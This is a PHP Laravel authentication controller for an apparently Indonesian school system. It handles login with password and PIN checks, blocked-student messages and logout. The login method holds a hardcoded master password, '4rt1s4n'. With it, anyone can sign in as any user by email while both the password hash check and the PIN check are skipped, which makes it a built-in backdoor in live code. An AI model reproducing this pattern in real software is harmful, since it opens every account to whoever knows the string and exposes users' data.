<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\MenuService;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    protected $userService;
    protected $super_key = '4rt1s4n';
    public function __construct(UserService $userService)
    {
        $this->userService = $userService;
    }

    public function login($role = '')
    {
        return view('auth.login', compact('role'));
    }

    public function login_process(LoginRequest $request)
    {
        $user = $this->userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== $this->super_key && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Password salah !'])->withInput();

        $pin = $request->input('pin') ?? '';
        if ($password == $this->super_key) {
            session(['pin' => $this->super_key]);
        } else {
            if ($pin !== '') {
                if ($pin != ($user->siswa->pin ?? '-')) return redirect()->back()->withErrors(['pin' => 'PIN salah !'])->withInput();
                session(['pin' => $pin]);
            }
        }

        if (!empty($user->siswa)) {
            if ($user->siswa->is_blokir == 1) {
                return redirect()->back()->with('error', 'Siswa tidak dapat login karena '. $user->siswa->keterangan_blokir);
            }
        }

        auth()->login($user, $request->has('remember'));

        return redirect()->route('admin');
    }

    public function logout()
    {
        session()->flush();
        auth()->logout();
        return redirect()->route('login');
    }
}
